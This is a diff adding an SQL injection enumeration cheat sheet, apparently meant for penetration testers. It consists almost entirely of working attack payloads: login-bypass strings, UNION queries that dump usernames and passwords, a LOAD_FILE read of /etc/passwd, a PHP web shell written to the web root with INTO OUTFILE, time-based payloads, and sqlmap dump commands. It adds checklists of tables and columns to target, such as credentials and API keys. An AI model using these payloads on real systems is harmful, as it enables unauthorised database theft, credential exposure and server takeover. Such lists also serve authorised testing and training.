@@ -1,0 +1,219 @@
+# SQL Injection Enumeration
+
+# Identify Input Points
+
+□ Login Form
+□ Search Box
+□ URL Parameter
+□ POST Parameter
+□ Cookie
+□ HTTP Header
+□ API Parameter
+
+# Basic SQLi Tests
+
+'
+"
+`
+')
+"))
+'
+
+# Boolean-Based Tests
+
+' AND 1=1--
+' AND 1=2--
+" AND "1"="1
+" AND "1"="2
+
+# OR-Based Tests
+
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+
+# Comment Characters
+
+--
+#
+/*
+
+# UNION-Based Tests
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+# Find Number of Columns
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+...
+
+# Version Enumeration
+
+' UNION SELECT @@version--
+' UNION SELECT version()--
+' UNION SELECT banner FROM v$version--
+
+# Current Database
+
+' UNION SELECT database()--
+' UNION SELECT current_database()--
+
+# Current User
+
+' UNION SELECT user()--
+' UNION SELECT current_user()
+
+# Database List (MySQL)
+
+' UNION SELECT schema_name,NULL FROM information_schema.schemata--
+
+# Table Enumeration
+
+' UNION SELECT table_name,NULL
+FROM information_schema.tables
+WHERE table_schema=database()--
+
+# Column Enumeration
+
+' UNION SELECT column_name,NULL
+FROM information_schema.columns
+WHERE table_name='users'--
+
+# Dump Data
+
+' UNION SELECT username,password FROM users--
+
+# File Read (If FILE Privilege Exists)
+
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+
+# File Write (MySQL)
+
+SELECT "<?php system($_GET['cmd']); ?>"
+INTO OUTFILE '/var/www/html/shell.php';
+
+# Error-Based SQLi
+
+'
+"
+
+# Time-Based SQLi
+
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+
+# MSSQL
+
+'; WAITFOR DELAY '0:0:5'--
+
+# PostgreSQL
+
+'; SELECT pg_sleep(5)--
+
+# Oracle
+
+'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)||'
+
+# SQLMap Detection
+
+sqlmap -u "http://IP/page.php?id=1"
+
+# SQLMap Enumeration
+
+sqlmap -u "URL" --dbs
+sqlmap -u "URL" --tables
+sqlmap -u "URL" --columns
+sqlmap -u "URL" --dump
+
+# SQLMap Cookie
+
+sqlmap -u "URL" --cookie="PHPSESSID=..."
+
+# SQLMap POST
+
+sqlmap -u "URL" --data="id=1"
+
+# SQLMap Risk
+
+sqlmap -u "URL" --risk=3 --level=5
+
+# Searchsploit
+
+searchsploit mysql
+searchsploit sql injection
+
+# Burp Suite
+
+Intercept Request
+Send to Repeater
+Send to Intruder
+
+# Useful SQL Functions
+
+version()
+database()
+user()
+current_user()
+@@version
+system_user()
+
+# Common Tables
+
+users
+user
+accounts
+admin
+login
+credentials
+members
+staff
+employee
+
+# Common Columns
+
+id
+username
+user
+email
+password
+passwd
+hash
+role
+admin
+token
+apikey
+
+# Common Databases
+
+information_schema
+mysql
+performance_schema
+sys
+wordpress
+drupal
+joomla
+
+# Things to Look For
+
+□ Login Bypass
+□ Error Messages
+□ SQL Errors
+□ Delay Response
+□ Different Response Length
+□ Database Version
+□ Database Name
+□ Usernames
+□ Password Hashes
+□ Email Addresses
+□ API Keys
+□ Configuration Tables
+□ Admin Accounts
+□ FILE Privilege
+□ INTO OUTFILE
+□ LOAD_FILE()
